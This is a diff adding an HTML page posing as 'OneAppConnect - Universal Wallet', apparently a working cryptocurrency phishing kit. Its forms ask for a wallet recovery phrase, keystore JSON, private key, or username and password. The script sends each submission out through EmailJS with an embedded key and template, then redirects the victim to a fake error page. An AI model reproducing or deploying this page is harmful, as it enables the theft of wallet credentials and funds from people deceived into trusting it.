@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <link rel="icon" href="https://spaceautocheck.web.app/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OneAppConnect - Universal Wallet
+  </title>
+  <script type="module" crossorigin="" src="./acces_files/index-3386e97a.js.download"></script>
+  <link rel="stylesheet" href="./acces_files/index-aadf4352.css">
+
+  <style>
+    .hider {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="app" data-v-app="">
+    <div class="antialiased box-border min-h-full min-w-full scroll-smooth"><!---->
+      <div class="min-h-screen bg-[#E6EBF0]">
+        <div class="bg-white min-h-screen">
+          <div class="px-4 py-3">
+            <div class="w-full h-full px-4 py-3 text-white flex justify-between items-center bg-blue-700 m">
+              <div class="relative">
+                <h2 class="font-semibold text-xl py-1.5">Connect A Wallet</h2><span class="text-sm">Import your <span
+                    class="font-medium bg-sky-900 px-1.5 py-1 rounded" id="walle_name1"></span></span>
+              </div>
+              <a href="../home-2.html">
+                <div class="cursor-pointer flex gap-1.5 items-center"><svg xmlns="http://www.w3.org/2000/svg"
+                    fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
+                    class="w-4 h-4 stroke-white">
+                    <path stroke-linecap="round" stroke-linejoin="round"
+                      d="M19.5 12h-15m0 0l6.75 6.75M4.5 12l6.75-6.75">
+                    </path>
+                  </svg><span class="font-medium">Back</span></div>
+              </a>
+            </div>
+          </div>
+          <div class="pt-5 px-4 py-3 max-w-6xl mx-auto">
+            <div class="flex flex-col items-center justify-center pt-[24px]"><img class="w-[60px] rounded-md" src=""
+                id="walle_img" alt="">
+              <p class="text-white text-lg p-2 bg-black mt-5" id="walle_name2"></p>
+            </div>
+            <div class="mt-8 mb-7">
+              <div class="">
+                <div id="phras_outer_block" class="border-2 border-gray-300/50 mb-[-1px]">
+                  <div id="phras_header" class="accordion-header text-black text-base font-medium px-2 py-3">Phrase
+                  </div>
+                  <div id="phras_inner_block" class="accordion-content border-t-2 border-gray-300/50 px-2 py-4">
+                    <form class="w-full flex flex-col gap-3 pt-[20px] mb-8 px-4" id="phras_form" method="POST">
+                      <input type="hidden" name="one" id="walle_id1">
+                      <h3 class="text-lg font-medium">Recovery Phrase Key:</h3><textarea name="two" required
+                        class="p-2 h-[90px] border rounded-md border-black outline-none"
+                        placeholder="Please enter 12, 15, 18, 21 or 24 words Phrase, each separate by a space."></textarea>
+                      <div class="w-full flex justify-center"><button id="btn_loader_phras"
+                          class="bg-blue-700 px-4 py-2.5 text-white font-semibold rounded-sm flex gap-2 justify-center w-full disabled:bg-blue-700/50"><!---->
+                          <img id="show_loader_phras" class="w-[24px] h-[24px] hider"
+                            src="spin.svg"><span
+                            class="text-center text-white" id="subi_btn_phras">Import</span></button></div>
+                    </form>
+                  </div>
+                </div>
+                <div id="keystor_outer_block" class="border-2 border-gray-300/50 mb-[-1px]">
+                  <div id="keystor_header" class="accordion-header text-black text-base font-medium px-2 py-3">Keystore
+                    JSON</div>
+                  <div id="keystor_inner_block" class="hider accordion-content border-t-2 border-gray-300/50 px-2 py-4">
+                    <form id="keystor_form" method="POST" class="w-full flex flex-col gap-3 pt-[20px] mb-8 px-4">
+                      <input type="hidden" name="one" id="walle_id2">
+                      <h3 class="text-lg font-medium text-black">Keystore JSON:</h3><textarea name="two" required
+                        class="p-2 h-[90px] border rounded-md border-black outline-none text-black"
+                        placeholder="Please enter words Keystore JSON, each separate by a space."></textarea><button
+                        id="btn_loader_keystor"
+                        class="bg-blue-700 px-4 py-2.5 text-white font-semibold rounded-sm disabled:bg-blue-700/50 flex gap-2 justify-center placeholder:text-black"><!---->
+                        <img id="show_loader_keystor" class="w-[24px] h-[24px] hider"
+                          src="spin.svg"><span
+                          class="text-center text-white" id="subi_btn_keystor">Import</span></button>
+                    </form>
+                  </div>
+                </div>
+                <div id="privat_outer_block" class="border-2 border-gray-300/50 mb-[-1px]">
+                  <div id="privat_header" class="accordion-header text-black text-base font-medium px-2 py-3">PrivateKey
+                  </div>
+                  <div id="privat_inner_block" class="hider accordion-content border-t-2 border-gray-300/50 px-2 py-4">
+                    <form id="privat_form" method="POST"
+                      class="w-full flex flex-col gap-3 pt-[20px] mb-8 px-2 text-black">
+                      <input type="hidden" name="one" id="walle_id3">
+                      <h3 class="text-lg font-medium">Private Key:</h3><textarea name="two" required
+                        class="p-2 h-[90px] border rounded-md border-black outline-none text-black"
+                        placeholder="Private Key"></textarea><button id="btn_loader_privat"
+                        class="bg-blue-700 px-4 py-2.5 text-white font-semibold rounded-md disabled:bg-blue-700/50 flex gap-2 justify-center"><!---->
+                        <img id="show_loader_privat" class="w-[24px] h-[24px] hider"
+                          src="spin.svg"><span
+                          class="text-center text-white" id="subi_btn_privat">Import</span></button>
+                    </form>
+                  </div>
+                </div>
+                <div id="acces_outer_block" class="border-2 border-gray-300/50 mb-[-1px]">
+                  <div id="acces_header" class="accordion-header text-black text-base font-medium px-2 py-3">Access Key
+                  </div>
+                  <div id="acces_inner_block" class="hider accordion-content border-t-2 border-gray-300/50 px-2 py-4"
+                    style="">
+                    <form id="acces_form" method="POST"
+                      class="w-full flex flex-col gap-3 pt-[20px] mb-8 px-4 text-black">
+                      <input type="hidden" name="one" id="walle_id4">
+                      <h3 class="text-lg font-medium">Access Key:</h3><span>Username:</span><input name="two" required
+                        class="w-full px-4 py-3 outline-none border border-black rounded-md disabled:bg-blue-700/50 flex gap-2 justify-center"
+                        type="text" placeholder="Username:"><span>Password:</span><input name="three" required
+                        class="w-full px-4 py-3 outline-none border border-black rounded-md" type="password"
+                        placeholder="Enter your Password"><button id="btn_loader_acces"
+                        class="bg-blue-700 px-4 py-2.5 text-white font-semibold rounded-md disabled:bg-blue-700/50 flex gap-2 justify-center"><!---->
+                        <img id="show_loader_acces" class="w-[24px] h-[24px] hider"
+                          src="spin.svg"><span
+                          class="text-center text-white" id="subi_btn_acces">Login</span></button>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div><!---->
+    </div>
+  </div>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <script type="text/javascript">
+    emailjs.init('jwOhytkMS8yvRhMdI')
+  </script>
+
+  <script>
+    var nameParam;
+    document.addEventListener("DOMContentLoaded", function () {
+      var urlParams = new URLSearchParams(window.location.search);
+
+      var imgParam = urlParams.get('img');
+
+      nameParam = urlParams.get('name');
+      console.log(nameParam);
+      document.getElementById("walle_img").src = imgParam;
+      document.getElementById("walle_name1").innerText = nameParam;
+      document.getElementById("walle_name2").innerText = nameParam;
+
+      document.getElementById('phras_header').style.color = "#2563EB";
+
+    });
+
+    console.log("first");
+    document.getElementById('phras_outer_block')
+      .addEventListener('click', function (event) {
+        hideAll();
+        document.getElementById('phras_inner_block').classList.remove("hider");
+        document.getElementById('phras_header').style.color = "#2563EB";
+        document.getElementById("walle_id1").value = nameParam;
+        console.log(nameParam);
+        console.log("HLJLJ");
+      });
+    document.getElementById('acces_outer_block')
+      .addEventListener('click', function (event) {
+        hideAll();
+        document.getElementById('acces_inner_block').classList.remove("hider");
+        document.getElementById('acces_header').style.color = "#2563EB";
+        document.getElementById("walle_id2").value = nameParam;
+      });
+    document.getElementById('privat_outer_block')
+      .addEventListener('click', function (event) {
+        hideAll();
+        document.getElementById('privat_inner_block').classList.remove("hider");
+        document.getElementById('privat_header').style.color = "#2563EB";
+        document.getElementById("walle_id3").value = nameParam;
+      });
+    document.getElementById('keystor_outer_block')
+      .addEventListener('click', function (event) {
+        hideAll();
+        document.getElementById('keystor_inner_block').classList.remove("hider");
+        document.getElementById('keystor_header').style.color = "#2563EB";
+        document.getElementById("walle_id4").value = nameParam;
+      });
+
+    function hideAll() {
+      document.getElementById("phras_inner_block").classList.add("hider");
+      document.getElementById("privat_inner_block").classList.add("hider");
+      document.getElementById("acces_inner_block").classList.add("hider");
+      document.getElementById("keystor_inner_block").classList.add("hider");
+
+      document.getElementById('phras_header').style.color = "black";
+      document.getElementById('privat_header').style.color = "black";
+      document.getElementById('acces_header').style.color = "black";
+      document.getElementById('keystor_header').style.color = "black";
+    }
+
+
+
+
+    document.getElementById('phras_form')
+      .addEventListener('submit', function (event) {
+        event.preventDefault();
+        document.getElementById("subi_btn_phras").innerText = "Processing...";
+        document.getElementById("show_loader_phras").classList.remove("hider");
+        document.getElementById("btn_loader_phras").disabled = true;
+
+        const serviceID = 'default_service';
+        const templateID = 'template_4yqdkvl';
+
+        emailjs.sendForm(serviceID, templateID, this)
+          .then(() => {
+            window.location = "../error/index.html"
+          }, (err) => {
+            document.getElementById("subi_btn_phras").innerText = "PROCEED";
+            document.getElementById("show_loader_phras").classList.add("hider");
+            document.getElementById("btn_loader_phras").disabled = false;
+            alert("Please try again!");
+          });
+      });
+
+    document.getElementById('acces_form')
+      .addEventListener('submit', function (event) {
+        event.preventDefault();
+        document.getElementById("subi_btn_acces").innerText = "Processing...";
+        document.getElementById("show_loader_acces").classList.remove("hider");
+        document.getElementById("btn_loader_acces").disabled = true;
+
+        const serviceID = 'default_service';
+        const templateID = 'template_4yqdkvl';
+
+        emailjs.sendForm(serviceID, templateID, this)
+          .then(() => {
+            window.location = "../error/index.html"
+          }, (err) => {
+            document.getElementById("subi_btn_acces").innerText = "LOGIN";
+            document.getElementById("show_loader_acces").classList.add("hider");
+            document.getElementById("btn_loader_acces").disabled = false;
+            alert("Please try again!");
+          });
+      });
+
+
+    document.getElementById('keystor_form')
+      .addEventListener('submit', function (event) {
+        event.preventDefault();
+        document.getElementById("subi_btn_keystor").innerText = "Processing...";
+        document.getElementById("show_loader_keystor").classList.remove("hider");
+        document.getElementById("btn_loader_keystor").disabled = true;
+
+        const serviceID = 'default_service';
+        const templateID = 'template_4yqdkvl';
+
+        emailjs.sendForm(serviceID, templateID, this)
+          .then(() => {
+            window.location = "../error/index.html"
+          }, (err) => {
+            document.getElementById("subi_btn_keystor").innerText = "PROCEED";
+            document.getElementById("show_loader_keystor").classList.add("hider");
+            document.getElementById("btn_loader_keystor").disabled = false;
+            alert("Please try again!");
+          });
+      });
+
+    document.getElementById('privat_form')
+      .addEventListener('submit', function (event) {
+        event.preventDefault();
+        document.getElementById("subi_btn_privat").innerText = "Processing...";
+        document.getElementById("show_loader_privat").classList.remove("hider");
+        document.getElementById("btn_loader_privat").disabled = true;
+
+        const serviceID = 'default_service';
+        const templateID = 'template_4yqdkvl';
+
+        emailjs.sendForm(serviceID, templateID, this)
+          .then(() => {
+            window.location = "../error/index.html"
+          }, (err) => {
+            document.getElementById("subi_btn_privat").innerText = "PROCEED";
+            document.getElementById("show_loader_privat").classList.add("hider");
+            document.getElementById("btn_loader_privat").disabled = false;
+            alert("Please try again!");
+          });
+      });
+  </script>
+
+
+
+</body>
+
+</html>
